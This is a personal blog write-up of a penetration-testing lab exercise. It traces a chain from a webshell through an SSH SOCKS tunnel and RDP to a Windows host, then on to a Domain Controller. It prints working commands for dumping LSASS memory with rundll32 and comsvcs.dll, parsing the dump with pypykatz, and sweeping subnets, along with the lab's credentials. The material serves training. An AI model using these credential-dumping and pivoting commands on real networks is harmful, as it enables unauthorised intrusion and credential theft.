---
title: "Pivoting, Tunneling"
date: 2026-07-14T23:40:42+03:00
draft: false

# Preview text shown on the home/list pages + used for SEO and social cards.
# Leave blank to auto-use the first ~30 words. `description` feeds meta/OG tags.
summary: ""
description: "A pivoting assessment where reaching the final Domain Controller means chaining credentials across a series of dual-homed hosts, "

# Taxonomies — keep consistent with existing posts.
# Convention: Title Case, no leading spaces, acronyms UPPERCASE (CTF, PE, DLL, DNS, API).
# Categories in use: Guide, Writeups
categories:
  - Writeups
  - Pentesting
tags:
  - Pivot
  - CPTS
  - LSASS
  - pypykatz
  

# Multi-part post? Use the same series name in each part and order them.
# series:
#   - Keyloggers
# series_order: 1
---

<!--
Tip: drop an image named `feature.png` (or feature.jpg/webp) in this post's
folder and it becomes the card thumbnail + hero automatically. See WRITING-POSTS.md.
-->
This is a walkthrough of a pivoting-focused assessment where the goal is to reach an internal Domain Controller that isn't directly reachable from our starting foothold. 

We'll go from an ```initial webshell 
→ SSH pivot 
→ RDP into a Windows host 
→ dumping credentials from memory 
→ pivoting again to the final targets.``` 
![pivot_topology_clean_full.png](pivot_topology_clean_full.png)

![WebadminFiles.png](WebadminFiles.png)
We start from a webshell, poking around we can see 2 files on webadmin's home directory an ssh key and a text file, and well i already want those on my kali to better take a look at them.
To get them on my machine i decided to try and run a python webserver and luckily python was installed.

```bash
python3 -m http.server #Port 8000 by default
```




![DirListing.png](DirListing.png)
Browsing over we can simply click around and download our 2 files

![file1.png](file1.png)
While this is not clear what is the ip of `server01` or whether it really exists with that name we can confirm that we will be jumping and pivoting around to get to our target. Most importantly now we got credentials `mlefay:Plain Human work!` , but we haven't seen any directory for `mlefay` on this machine so its a hint that its no on this machine.
Turning our attention to our next file which is the `id_rsa` and honestly it is not clear which user is this for exactly so its just trial and error now, but for us to try we need to prepare the file like so:

```bash                 
cp id_rsa ~/.ssh/id_rsa 
sudo chmod 400 ~/.ssh/id_rsa 
```

The first command is putting `id_rsa` in our .ssh folder which the ssh client reads to check if we have any ssh it can use when we don't provide a password (which we wont because we don't know the password)

second command just sets the permissions because when we downloaded it from the python web-server w did not download the permissions with it
400 means: Owner can read the file + No one else has access

![adminSSH.png](adminSSH.png)
not for administrator :(


![weadminSSH.png](weadminSSH.png)
but for `webadmin` :)


First thing that comes to mind is try to read the bash history as i tried reading it with the web shell user `www-data` but it restricted the `webadmin` user.
The bash history it could give us any hint to what the user have been working on and if there is anything related to our next hop and it's ip address.

```bash
webadmin@inlanefreight:~$ cat .bash_history 
SNIP
...
...
arp -a
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
ls
chmod +x backupjob 
./backupjob 
exit
./backupjob 
sudo apt install net-tools ifupdown iptables-persistent
...
...
SNIP

```

```bash
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```
Taking a closer  look on the commands we see a ping sweep on a 172.16.5.0/24 network.

![PivotHostInterfaces.png](PivotHostInterfaces.png)
Digging on the interfaces we can see another interface with `ens192` with ip `172.16.5.15` now we know our next jump is will be on that subnet and this is the pivot host all along. We will use this machine as our foothold into the other subnet because it has can reach both networks the one we have we are connected with with our ssh connection and the internal one on `ens192`.

```bash
webadmin@inlanefreight:~$ for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
64 bytes from 172.16.5.15: icmp_seq=1 ttl=64 time=0.150 ms
64 bytes from 172.16.5.35: icmp_seq=1 ttl=128 time=1.78 ms
```
Let us first re-run the ping command previously ran we can see that of our ip replied and we have 172.16.5.35 which is a windows host from the`TTL`.

> i did notice that the script searches as if its a /24 subnet instead of /16 meaning that 172.16.x.x where x can range anywhere from 0 to 255 but i guess this was intentional as there is no hosts that can be found other than what this scripts finds.

Now its time to do some pivoting, since we have our ssh creds we can establish a dynamic tunnel so we can RDP though our pivot host (10.129.99.68) through the other interface it has  `172.16.5.15` into the windows machine `172.16.5.35`.

We need a tunnel as we cannot download an RDP client on this machine and we could need our tools on kali later on. The tunnel allows us to forward our tools traffic though that tunnel to the other side (in this case its 172.16.5.35).

Lets log out of our ssh session and start a new one with `-D` flag
```bash
 ssh -D 1080 webadmin@10.129.99.68
```

 Set our proxychains on our attack-host
```/etc/proxychains.conf
[ProxyList]
socks5  127.0.0.1 1080
```

Now from our Kali machine 
```bash
proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!'
```

![RDP2win1.png](RDP2win1.png)

Now it took me a while and some research, some trial and error to figure out what we do next but i figured out how can we get more creds i found we can dump the `LSASS` from memory.
![LSASS.png](LSASS.png)
After fighting with `lsassy` for a bit i decided this was unnecessary in this case because i noticed i can just dump it using `comsvcs.dll` and loading it with `rundll32.exe` because `mlefay` can run powershell as admin

```powershell
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Windows\Temp\lsass.dmp full
```

```bash
pypykatz lsa minidump lsass.dmp
```


![pypykatz.png](pypykatz.png)

We found the next set of credentials we can use:`vfrank:Imply wet Unmasked!` 
Now we are back to enumeration, we have to find our next target for those credentials!

![Win1Interfaces.png](Win1Interfaces.png)

Checking out the interfaces again on this machine it is also connected directly to another subnet, this is good news we don't have to dig another tunnel we can RDP directly from this machine to the other target

```powershell
1..254 | % {"172.16.6.$($_): $(Test-Connection -count 1 -comp 172.16.6.$($_) -quiet)"}
```

![PingSweep.png](PingSweep.png)
Running scan like this twice helped because the first run fills up the ARP cache and by the second time you will actually get a response as the OS knows the mac address for that ip already instead of asking.

![Flagwin2.png](Flagwin2.png)

workstation flag

![FlagDC.png](FlagDC.png)
DC Flag


Two ideas are worth taking away beyond this lab:

1. A pivot host is just a machine that can see a network you can't. Every jump here worked because some host had an interface on both the segment we could reached and the one we wanted to reach

2. No single set of creds opened everything; each host we compromised gave us the creds for the next one. 

Thanks for reading :)
